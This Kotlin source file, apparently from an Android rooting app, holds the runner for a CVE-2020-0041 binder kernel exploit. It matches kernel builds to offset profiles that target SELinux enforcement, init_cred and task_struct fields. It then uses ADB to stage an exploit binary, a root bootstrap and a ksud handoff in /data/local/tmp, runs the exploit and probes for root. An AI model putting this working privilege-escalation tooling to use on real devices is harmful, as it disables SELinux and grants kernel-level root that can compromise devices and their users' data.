// SPDX-License-Identifier: GPL-3.0-or-later OR Apache-2.0
package com.hexo141.liquidglass.root

import android.content.Context
import android.util.Log
import com.hexo141.liquidglass.adb.AbsAdbConnectionManager
import com.hexo141.liquidglass.adb.AdbShell
import java.io.File

/**
 * Sixth engine: CVE-2020-0041, an out-of-bounds write in the binder driver's node/ref handling.
 *
 * Unlike GhostLock this engine covers two kernel families with one binary:
 *
 *   - plain 5.4 (`5.4.xxx-android11-9-...`)
 *   - 5.4-qgki, which is the same kernel behind Qualcomm's frozen vendor interface
 *
 * Both are driven by a *target profile*: the set of symbol offsets and `task_struct` member offsets
 * for one specific kernel build. A profile is a short text file, so adding a kernel is adding a
 * file, and the arm64 binary never changes.
 *
 * The profiles live under `assets/binder54/`. A `*-template` file is a skeleton with placeholder
 * zeros: it is never matched automatically, and running it is refused rather than attempted,
 * because a zero offset means "write to the kernel image base", which panics the device.
 */
object BinderBombRunner {

    private const val TAG = "BinderBomb"

    /** Where the profiles live in the APK. */
    private const val ASSET_DIR = "binder54"

    /** The staged layout on the device, kept separate from GhostLock's directory. */
    private const val REMOTE_DIR = "/data/local/tmp/openroot"

    /**
     * The packaged payload name.
     *
     * Android only unpacks `lib*.so` entries from `jniLibs`, so the executable `binder54` is
     * packaged as `libbinder54.so` and shows up in nativeLibraryDir under that name. It is still a
     * normal executable file - the runner execs it, it is never `dlopen`ed.
     */
    private const val PAYLOAD_NAME = "libbinder54.so"

    /** The name the staged copy is given on the device. */
    private const val PAYLOAD_REMOTE = "binder54"

    /** The profile is written next to the binary so a relative path works from `cd`. */
    private const val PROFILE_NAME = "binder54-profile.conf"

    /** The shared root-handoff bootstrap, packaged by the other engines under the same name. */
    private const val BOOTSTRAP = "libopenbootstrap.so"

    /** Its staged name: the payload execs this once it has kernel read/write. */
    private const val BOOTSTRAP_REMOTE = "loader"

    /** Thrown when no bundled profile matches the running kernel. */
    class UnsupportedKernelException(release: String) :
        Exception("No binder profile for kernel \"$release\"")

    /** A profile that is known to exist in the APK. */
    data class Profile(
        /** Exact `uname -r`, or a template placeholder. */
        val release: String,
        /** File name inside `assets/binder54/`. */
        val file: String,
        /** The file is a skeleton: present, but has no usable numbers. */
        val template: Boolean,
    )

    /** What a profile says about itself, once parsed. */
    data class Loaded(
        val profile: Profile,
        /** `key = value` lines ready to push, with the release line fixed up to the real one. */
        val contents: String,
        /** True when every required number is non-zero. */
        val complete: Boolean,
        /** The binder device the profile names, for the log line. */
        val device: String,
    )

    @Volatile
    private var index: List<Profile>? = null

    /**
     * Every profile key the native loader requires, in the order it reports them.
     *
     * Duplicated from `include/target_profile.h` on purpose: keeping the two lists separate means a
     * mismatch is visible as a failed run rather than silently accepted here.
     */
    private val REQUIRED_KEYS = listOf(
        "selinux_enforcing_offset",
        "memstart_addr_offset",
        "sysctl_table_root_offset",
        "proc_douintvec_offset",
        "init_task_offset",
        "init_cred_offset",
        "pipe_fop_offset",
        "tasks_offset",
        "pid_offset",
        "mm_offset",
        "real_cred_offset",
    )

    /** Whether this ABI got the payload (the APK only ships arm64). */
    fun isPayloadPresent(context: Context): Boolean =
        File(context.applicationInfo.nativeLibraryDir, PAYLOAD_NAME).isFile

    /**
     * The profile for [kernelRelease], or null when this build has none.
     *
     * Matching is exact, and templates never match: a template's `release` is a placeholder string,
     * so an exact comparison already excludes it, but the flag is checked as well to keep that
     * property obvious at the call site.
     */
    fun profileFor(context: Context, kernelRelease: String): Profile? {
        val release = kernelRelease.trim()
        if (release.isEmpty()) return null
        return indexOf(context)?.firstOrNull { !it.template && it.release == release }
    }

    /** True when a usable profile exists for [kernelRelease]. */
    fun isSupported(context: Context, kernelRelease: String): Boolean =
        profileFor(context, kernelRelease) != null

    /** Engine name for the status card, or null when no profile matches. */
    fun describe(context: Context, kernelRelease: String): String? {
        val profile = profileFor(context, kernelRelease) ?: return null
        return "CVE-2020-0041 (${profile.release})"
    }

    /** How many kernel builds the bundled profile set covers, templates excluded. */
    fun supportedKernelCount(context: Context): Int =
        indexOf(context)?.count { !it.template } ?: 0

    /**
     * Reads [profile] and checks that it carries real numbers.
     *
     * The release line is replaced with [kernelRelease] so the native side annotates its log with
     * the actual device kernel rather than whatever the file happened to contain.
     */
    fun load(context: Context, profile: Profile, kernelRelease: String): Loaded? = runCatching {
        val text = context.assets.open("$ASSET_DIR/${profile.file}")
            .bufferedReader().use { it.readText() }
        val values = parseValues(text)
        val rewritten = text.lineSequence()
            .filterNot { it.trimStart().startsWith("release") }
            .joinToString("\n")
        Loaded(
            profile = profile,
            contents = "release = $kernelRelease\n$rewritten",
            complete = REQUIRED_KEYS.all { key -> (values[key] ?: 0L) != 0L },
            device = parseString(text, "binder_device").ifEmpty { "/dev/binder" },
        )
    }.onFailure { Log.w(TAG, "cannot read ${profile.file}", it) }.getOrNull()

    /** The first `key = <text>` value in [text], or empty when absent. */
    private fun parseString(text: String, key: String): String {
        for (raw in text.lineSequence()) {
            val line = raw.substringBefore('#').trim()
            if (!line.startsWith(key)) continue
            val split = line.indexOf('=')
            if (split <= 0) continue
            if (line.substring(0, split).trim() != key) continue
            return line.substring(split + 1).trim().trim('"')
        }
        return ""
    }

    /** `key = value` pairs, ignoring comments and blank lines. */
    private fun parseValues(text: String): Map<String, Long> {
        val values = LinkedHashMap<String, Long>()
        for (raw in text.lineSequence()) {
            val line = raw.substringBefore('#').trim()
            if (line.isEmpty()) continue
            val split = line.indexOf('=')
            if (split <= 0) continue
            val key = line.substring(0, split).trim()
            val value = line.substring(split + 1).trim()
            // Base 0 so `0x2ba4000` and `45760512` both parse.
            val number = when {
                value.startsWith("0x", ignoreCase = true) ->
                    value.drop(2).toLongOrNull(16)
                else -> value.toLongOrNull()
            }
            if (number != null) values[key] = number
        }
        return values
    }

    /**
     * Stages the payload plus its profile, then runs it and reports what root came back.
     *
     * The native side starts the same `loader` bootstrap the other engines use, so the
     * `su_manager` preference file is staged here too: without it the payload falls back to a
     * root command channel instead of late-loading `ksud`.
     *
     * @param suManager the manager to hand off to, or null to keep a root command channel
     */
    @Throws(Exception::class)
    fun run(
        context: Context,
        manager: AbsAdbConnectionManager,
        kernelRelease: String,
        suManager: KsuManager.Target?,
        onLine: (String) -> Unit,
        onProgress: (Float) -> Unit = {},
    ): Result {
        val payloadFile = File(context.applicationInfo.nativeLibraryDir, PAYLOAD_NAME)
        require(payloadFile.isFile) {
            "Payload is not packaged for this ABI (${payloadFile.absolutePath})"
        }
        val bootstrap = File(context.applicationInfo.nativeLibraryDir, BOOTSTRAP)
        require(bootstrap.isFile) { "bootstrap is not packaged for this ABI" }

        val profile = profileFor(context, kernelRelease)
            ?: throw UnsupportedKernelException(kernelRelease)
        val loaded = load(context, profile, kernelRelease)
            ?: throw IllegalStateException("Cannot read profile ${profile.file}")
        if (!loaded.complete) {
            // A zero offset means "write to the image base", which panics. Refuse instead.
            val missing = REQUIRED_KEYS.filter { key ->
                parseValues(loaded.contents)[key].let { it == null || it == 0L }
            }
            throw IllegalStateException(
                "Profile ${profile.file} is incomplete: ${missing.joinToString(", ")}",
            )
        }

        onProgress(0.06f)
        onLine("$ mkdir -p $REMOTE_DIR")
        AdbShell.exec(manager, "mkdir -p $REMOTE_DIR")

        // AdbShell.stage drops the bytes in this app's external cache first, so the shell only
        // copies a file it can already read. Piping through `cat` over stdin looked fine in the
        // log but every staged file landed as 0 bytes on the Shizuku transport.
        val relayDir = context.getExternalCacheDir()

        AdbShell.stage(
            manager,
            "$REMOTE_DIR/$PAYLOAD_REMOTE",
            payloadFile.readBytes(),
            relayDir,
            "stage-binder54.bin",
            onLine,
        )
        onProgress(0.18f)
        onLine("$ chmod 755 $REMOTE_DIR/$PAYLOAD_REMOTE")
        AdbShell.chmod(manager, "$REMOTE_DIR/$PAYLOAD_REMOTE", "755")

        AdbShell.stage(
            manager,
            "$REMOTE_DIR/$PROFILE_NAME",
            loaded.contents.toByteArray(),
            relayDir,
            "stage-binder54.conf",
            onLine,
        )
        onProgress(0.28f)
        onLine("$ chmod 644 $REMOTE_DIR/$PROFILE_NAME")
        AdbShell.chmod(manager, "$REMOTE_DIR/$PROFILE_NAME", "644")

        AdbShell.stage(
            manager,
            "$REMOTE_DIR/$BOOTSTRAP_REMOTE",
            bootstrap.readBytes(),
            relayDir,
            "stage-bootstrap.bin",
            onLine,
        )
        onProgress(0.36f)
        onLine("$ chmod 755 $REMOTE_DIR/$BOOTSTRAP_REMOTE")
        AdbShell.chmod(manager, "$REMOTE_DIR/$BOOTSTRAP_REMOTE", "755")

        // Same preference contract the other engines use; "none" selects the root channel.
        val managerValue = suManager?.packageName.orEmpty().ifEmpty { "none" }
        val prefs = """
            <?xml version='1.0' encoding='utf-8' standalone='yes' ?>
            <map>
                <string name="su_manager">$managerValue</string>
                <boolean name="soft_reboot" value="false" />
                <boolean name="disable_modules" value="false" />
            </map>
        """.trimIndent().toByteArray()
        AdbShell.stage(
            manager,
            "$REMOTE_DIR/openroot.xml",
            prefs,
            relayDir,
            "stage-prefs.xml",
            onLine,
        )
        onProgress(0.44f)
        AdbShell.chmod(manager, "$REMOTE_DIR/openroot.xml", "644")

        if (suManager != null) {
            // Two ways to get ksud on the device: keep one an earlier run already staged, or read
            // the manager's library from this app and let the shell copy the relay file. A `dd` of
            // the manager's private lib dir cannot work - the shell user cannot open that path.
            val alreadyStaged = AdbShell.exec(
                manager,
                "test -s $REMOTE_DIR/ksud && test -x $REMOTE_DIR/ksud && echo ok",
            ).contains("ok")

            if (alreadyStaged) {
                onLine("$ test -x $REMOTE_DIR/ksud    # already staged, skipping")
                onProgress(0.5f)
            } else {
                val ksudBytes = KsuManager.readKsud(suManager.ksudPath)
                    ?: throw IllegalStateException("Cannot stage ksud (${suManager.ksudPath})")
                AdbShell.stage(
                    manager,
                    "$REMOTE_DIR/ksud",
                    ksudBytes,
                    relayDir,
                    "stage-ksud.bin",
                    onLine,
                )
                onLine("$ chmod 755 $REMOTE_DIR/ksud")
                AdbShell.chmod(manager, "$REMOTE_DIR/ksud", "755")
                onProgress(0.5f)

                val staged = AdbShell.exec(
                    manager,
                    "test -s $REMOTE_DIR/ksud && test -x $REMOTE_DIR/ksud && echo ok",
                ).contains("ok")
                if (!staged) throw IllegalStateException("Cannot stage ksud (${suManager.ksudPath})")
            }
        }

        onProgress(0.56f)
        onLine("<i> kernel $kernelRelease via ${profile.file}, binder on ${loaded.device}")
        onLine("$ cd $REMOTE_DIR && ./$PAYLOAD_REMOTE $PROFILE_NAME $BOOTSTRAP_REMOTE")
        // The exploit stalls while it races the allocator, so the idle watchdog has to outlive
        // several silent gaps.
        val exitCode = AdbShell.stream(
            manager,
            "cd $REMOTE_DIR && TMPDIR=$REMOTE_DIR HOME=$REMOTE_DIR " +
                "./$PAYLOAD_REMOTE $PROFILE_NAME $BOOTSTRAP_REMOTE 2>&1",
            onLine,
            idleTimeoutMs = 300_000,
        )
        onProgress(0.9f)

        val handoff = RootHandoff.probe(manager, onLine, waitMs = 25_000)
        onProgress(1f)
        return Result(exitCode, handoff)
    }

    /** Outcome of one run. */
    data class Result(val exitCode: Int, val handoff: RootHandoff.Result)

    /** Parses the profile file names once: `<release>.conf` and `<release>-template.conf`. */
    private fun indexOf(context: Context): List<Profile>? {
        index?.let { return it }
        val names = runCatching { context.assets.list(ASSET_DIR)?.toList() }.getOrNull() ?: return null
        val parsed = names.filter { it.endsWith(".conf") }.map { file ->
            val name = file.removeSuffix(".conf")
            val template = name.endsWith("-template")
            // A template's placeholder `release` value lives inside the file, so the name here only
            // has to be something that cannot collide with a real `uname -r`; the suffix does that.
            Profile(release = name, file = file, template = template)
        }
        index = parsed
        Log.i(TAG, "loaded ${parsed.size} binder profiles (${parsed.count { !it.template }} real)")
        return parsed
    }
}